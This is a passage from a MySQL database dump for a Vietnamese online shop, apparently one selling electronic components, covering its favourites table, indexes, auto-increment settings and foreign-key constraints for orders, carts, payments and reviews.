(3, 'Tư vấn', '/consult', 3, 1, '2025-06-02 15:18:12'),
(4, 'Tin tức', '/blog', 4, 1, '2025-06-02 15:18:12'),
(5, 'Sản phảm', '/AllLinhkien', 5, 1, '2025-06-02 15:36:11');

-- --------------------------------------------------------

--
-- Table structure for table `yeu_thich`
--

CREATE TABLE `yeu_thich` (
  `id` int NOT NULL,
  `ma_nguoi_dung` int NOT NULL,
  `id_product` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL,
  `ngay_them` datetime DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `banner`
--
ALTER TABLE `banner`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `chu_chay`
--
ALTER TABLE `chu_chay`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `dang_ky`
--
ALTER TABLE `dang_ky`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `phone` (`phone`),
  ADD UNIQUE KEY `email` (`email`);

--
-- Indexes for table `danh_gia`
--
ALTER TABLE `danh_gia`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `dia_chi_giao_hang`
--
ALTER TABLE `dia_chi_giao_hang`
  ADD PRIMARY KEY (`ma_dia_chi`),
  ADD KEY `ma_tk` (`ma_tk`);

--
-- Indexes for table `don_hang`
--
ALTER TABLE `don_hang`
  ADD PRIMARY KEY (`id`),
  ADD KEY `ma_nguoi_dung` (`ma_nguoi_dung`),
  ADD KEY `ma_dia_chi` (`ma_dia_chi`);

--
-- Indexes for table `footer`
--
ALTER TABLE `footer`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `gio_hang`
--
ALTER TABLE `gio_hang`
  ADD PRIMARY KEY (`id`),
  ADD KEY `gio_hang_ibfk_1` (`ma_nguoi_dung`);

--
-- Indexes for table `hoa_don`
--
ALTER TABLE `hoa_don`
  ADD PRIMARY KEY (`id`),
  ADD KEY `ma_don_hang` (`ma_don_hang`);

--
-- Indexes for table `lien_he`
--
ALTER TABLE `lien_he`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `phan_hoi_review`
--
ALTER TABLE `phan_hoi_review`
  ADD PRIMARY KEY (`id`),
  ADD KEY `phan_hoi_review_ibfk_1` (`id_danh_gia`);

--
-- Indexes for table `thanh_toan`
--
ALTER TABLE `thanh_toan`
  ADD PRIMARY KEY (`id`),
  ADD KEY `ma_don_hang` (`ma_don_hang`);

--
-- Indexes for table `top_menu`
--
ALTER TABLE `top_menu`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `yeu_thich`
--
ALTER TABLE `yeu_thich`
  ADD PRIMARY KEY (`id`),
  ADD KEY `ma_nguoi_dung` (`ma_nguoi_dung`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `banner`
--
ALTER TABLE `banner`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `chu_chay`
--
ALTER TABLE `chu_chay`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `dang_ky`
--
ALTER TABLE `dang_ky`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT for table `danh_gia`
--
ALTER TABLE `danh_gia`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `dia_chi_giao_hang`
--
ALTER TABLE `dia_chi_giao_hang`
  MODIFY `ma_dia_chi` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=65;

--
-- AUTO_INCREMENT for table `don_hang`
--
ALTER TABLE `don_hang`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=72;

--
-- AUTO_INCREMENT for table `footer`
--
ALTER TABLE `footer`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `gio_hang`
--
ALTER TABLE `gio_hang`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=54;

--
-- AUTO_INCREMENT for table `hoa_don`
--
ALTER TABLE `hoa_don`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- AUTO_INCREMENT for table `lien_he`
--
ALTER TABLE `lien_he`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `phan_hoi_review`
--
ALTER TABLE `phan_hoi_review`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- AUTO_INCREMENT for table `thanh_toan`
--
ALTER TABLE `thanh_toan`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=72;

--
-- AUTO_INCREMENT for table `top_menu`
--
ALTER TABLE `top_menu`
  MODIFY `id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `yeu_thich`
--
ALTER TABLE `yeu_thich`
  MODIFY `id` int NOT NULL AUTO_INCREMENT;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `dia_chi_giao_hang`
--
ALTER TABLE `dia_chi_giao_hang`
  ADD CONSTRAINT `dia_chi_giao_hang_ibfk_1` FOREIGN KEY (`ma_tk`) REFERENCES `dang_ky` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `don_hang`
--
ALTER TABLE `don_hang`
  ADD CONSTRAINT `don_hang_ibfk_1` FOREIGN KEY (`ma_nguoi_dung`) REFERENCES `dang_ky` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `don_hang_ibfk_2` FOREIGN KEY (`ma_dia_chi`) REFERENCES `dia_chi_giao_hang` (`ma_dia_chi`) ON DELETE SET NULL;

--
-- Constraints for table `gio_hang`
--
ALTER TABLE `gio_hang`
  ADD CONSTRAINT `gio_hang_ibfk_1` FOREIGN KEY (`ma_nguoi_dung`) REFERENCES `dang_ky` (`id`) ON DELETE RESTRICT ON UPDATE RESTRICT;

--
-- Constraints for table `hoa_don`
--
ALTER TABLE `hoa_don`
  ADD CONSTRAINT `hoa_don_ibfk_1` FOREIGN KEY (`ma_don_hang`) REFERENCES `don_hang` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `phan_hoi_review`
--
ALTER TABLE `phan_hoi_review`
  ADD CONSTRAINT `phan_hoi_review_ibfk_1` FOREIGN KEY (`id_danh_gia`) REFERENCES `danh_gia` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT;

--
-- Constraints for table `thanh_toan`
--
ALTER TABLE `thanh_toan`
  ADD CONSTRAINT `thanh_toan_ibfk_1` FOREIGN KEY (`ma_don_hang`) REFERENCES `don_hang` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `yeu_thich`
--
ALTER TABLE `yeu_thich`
  ADD CONSTRAINT `yeu_thich_ibfk_1` FOREIGN KEY (`ma_nguoi_dung`) REFERENCES `dang_ky` (`id`) ON DELETE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
